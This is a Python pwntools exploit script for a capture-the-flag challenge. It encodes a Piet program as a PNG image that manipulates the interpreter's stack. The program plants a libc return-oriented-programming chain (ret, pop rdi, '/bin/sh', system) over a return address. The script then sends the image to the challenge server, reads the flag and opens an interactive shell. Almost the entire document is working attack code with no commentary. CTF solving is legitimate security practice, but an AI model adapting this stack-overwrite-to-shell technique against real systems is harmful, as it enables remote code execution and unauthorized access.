import io
from PIL import Image
from pwn import *

INSTRUCTIONS = [
    ['nop', 'push', 'pop'],
    ['add', 'sub', 'mul'],
    ['div', 'mod', 'not'],
    ['greater', 'pointer', 'switch'],
    ['dup', 'roll', 'up'],
    ['in_c', 'nuh', 'down'],
]
instruction_map = {}
for dh, row in enumerate(INSTRUCTIONS):
    for dl, cmd in enumerate(row):
        instruction_map[cmd] = dl % 3, dh

img_dict = {}
l, h = 0, 0
r, c = 0, 0
img_dict[r, c] = l, h

def exec(cmds):
    global l, h, r, c
    for cmd in cmds.split():
        dl, dh = instruction_map[cmd]
        l, h = (l + dl) % 3, (h + dh) % 6
        img_dict[0, c := c + 1] = l, h

def push(n):
    global l, h, r, c
    if n == 0:
        exec('push not')
    elif n <= 20:
        for _ in range(n - 1):
            img_dict[0, c := c + 1] = l, h
        exec('push')
    else:
        push(0)
        for i in range(32):
            push(2)
            exec('mul')
            if (n >> (31 - i)) % 2:
                push(1)
                exec('add')

def dup_second():
    # push a copy of the second value on the stack
    global l, h, r, c
    push(2)
    push(1)
    exec('roll dup dup dup down down down')
    push(2)
    push(1)
    exec('roll')
    push(0)
    push(0)
    exec('up add add')

def dup_u64(diff):
    # push a copy of the top 2 u32s on the stack, added by diff
    dup_second()
    if diff > 0:
        push(diff)
        exec('add')
    elif diff < 0:
        push(-diff)
        exec('sub')
    dup_second()

libc = ELF(libcdb.search_by_build_id('90ebd03ae9d9f42b23b4eb82fdf70352cf744198'))  # libc 2.43-2ubuntu2
rop = ROP([libc])
MAIN_RET = libc.libc_start_main_return
RET = rop.find_gadget(['ret']).address
RDI_RET = rop.find_gadget(['pop rdi', 'ret']).address
BIN_SH = next(libc.search(b'/bin/sh'))
SYSTEM = libc.symbols['system']

# move stack so libc MAIN_RET u64 addr makes up top two elements of stack
for i in range(0x438 // 4 + 2):
    exec('up')

# now push RET, RDI_RET, BIN_SH, and SYSTEM on top (standard ROP payload)
dup_u64(diff=RET - MAIN_RET)
dup_u64(diff=RDI_RET - RET)
dup_u64(diff=BIN_SH - RDI_RET)
dup_u64(diff=SYSTEM - BIN_SH)

# top 8 u32s make up ROP payload
# return address is at 0x418, which is 18 u32s below
# so roll the ROP payload to the right place
push(18)
push(8)
exec('roll')

# exit sequence (ends at Z)
#
# -> ..XY Z
#       YYZ
#         Z
img_dict[(1, c)] = img_dict[(1, c + 1)] = img_dict[(0, c)]
c += 1
exec('switch')
img_dict[(1, c)] = img_dict[(2, c)] = img_dict[(0, c)]

height = max(r for r, c in img_dict.keys()) + 1
width = max(c for r, c in img_dict.keys()) + 1
img = Image.new("RGB", (width, height))
COLOR_MAP = {
    (0, 0): (0xC0, 0x00, 0x00), (0, 1): (0xC0, 0xC0, 0x00), (0, 2): (0x00, 0xC0, 0x00),
    (0, 3): (0x00, 0xC0, 0xC0), (0, 4): (0x00, 0x00, 0xC0), (0, 5): (0xC0, 0x00, 0xC0),
    (1, 0): (0xFF, 0x00, 0x00), (1, 1): (0xFF, 0xFF, 0x00), (1, 2): (0x00, 0xFF, 0x00),
    (1, 3): (0x00, 0xFF, 0xFF), (1, 4): (0x00, 0x00, 0xFF), (1, 5): (0xFF, 0x00, 0xFF),
    (2, 0): (0xFF, 0xC0, 0xC0), (2, 1): (0xFF, 0xFF, 0xC0), (2, 2): (0xC0, 0xFF, 0xC0),
    (2, 3): (0xC0, 0xFF, 0xFF), (2, 4): (0xC0, 0xC0, 0xFF), (2, 5): (0xFF, 0xC0, 0xFF),
}
for (r, c), color in img_dict.items():
    img.putpixel((c, r), COLOR_MAP[color])
png = io.BytesIO()
img.save(png, format='png')
# img.save('output.png', format='png')
print(f'Constructed Piet image: {height} x {width}')

io = remote('piet.instances.ctf.l3ak.team', 1337, ssl=True)
io.send(png.getvalue())

io.clean(timeout=1)
io.sendline(b'cat flag.txt')
io.interactive()
